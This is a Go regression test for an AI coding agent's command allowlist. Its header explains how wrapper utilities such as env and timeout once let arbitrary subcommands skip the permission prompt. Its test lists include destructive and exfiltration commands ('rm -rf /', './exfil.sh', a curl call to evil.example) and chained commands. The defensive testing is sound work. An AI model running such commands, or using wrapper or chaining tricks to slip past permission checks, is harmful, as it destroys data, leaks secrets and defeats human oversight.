package tools

// B-1 regression test (found by a full-project @crush --role reviewer
// audit, 2026-08-11): safeCommands used to include command-wrapper
// utilities (env, nice, nohup, time, timeout) that execute an arbitrary
// subcommand. isSafeReadOnlyCommand matches on prefix alone, so
// "env rm -rf ./secrets", "timeout 10 ./exfil.sh", "nice npm install
// malicious-package" etc. all matched the wrapper's own prefix and were
// treated as safe read-only — skipping permissions.Request entirely (see
// bash.go's NewBashTool) and letting the wrapped, genuinely arbitrary
// subcommand run completely unchecked. This defeated --restrict-run's
// deny-by-default guarantee for any allowlist that didn't happen to also
// block these five wrapper names specifically.
//
// REVERT CHECK PROCEDURE:
//  1. In safe.go, add "env", "nice", "nohup", "time", "timeout" back to
//     safeCommands.
//  2. Run: go test ./internal/agent/tools -run TestSafeCommands_WrapperUtilitiesAreNotSafe -v
//  3. FAIL: isSafeReadOnlyCommand("env rm -rf /") returns true.
//  4. Remove them again and PASS.

import "testing"

func TestSafeCommands_WrapperUtilitiesAreNotSafe(t *testing.T) {
	dangerous := []string{
		"env rm -rf ./secrets",
		"env -i ./exfil.sh",
		"nice rm -rf /",
		"nice -n 10 npm install malicious-package",
		"nohup ./exfil.sh &",
		"timeout 10 ./exfil.sh",
		"timeout -k 5 30 curl http://evil.example/steal",
		"time rm -rf /",
	}
	for _, cmd := range dangerous {
		if isSafeReadOnlyCommand(cmd) {
			t.Errorf("isSafeReadOnlyCommand(%q) = true, want false — a command-wrapper utility must never bypass the permission prompt for its wrapped subcommand", cmd)
		}
	}
}

// TestSafeCommands_GenuinelySafeCommandsStillFast proves the fix didn't
// overcorrect: ordinary read-only commands (including the replacement
// printenv suggested for env's legitimate use) still skip the permission
// prompt.
func TestSafeCommands_GenuinelySafeCommandsStillFast(t *testing.T) {
	safe := []string{
		"ls -la",
		"pwd",
		"printenv",
		"git status",
		"git diff HEAD~1",
		"whoami",
	}
	for _, cmd := range safe {
		if !isSafeReadOnlyCommand(cmd) {
			t.Errorf("isSafeReadOnlyCommand(%q) = false, want true — this is a genuinely read-only command that should skip the permission prompt", cmd)
		}
	}
}

// TestSafeCommands_CompoundCommandsNeverSafe proves the compound-command
// guard (shell.IsCompoundCommand) still applies even for an otherwise-safe
// prefix, so a safe command can never smuggle a chained destructive one.
func TestSafeCommands_CompoundCommandsNeverSafe(t *testing.T) {
	compound := []string{
		"git status && rm -rf /",
		"ls; rm -rf /",
		"git status\nrm -rf /",
	}
	for _, cmd := range compound {
		if isSafeReadOnlyCommand(cmd) {
			t.Errorf("isSafeReadOnlyCommand(%q) = true, want false — a compound command must always require the permission prompt", cmd)
		}
	}
}
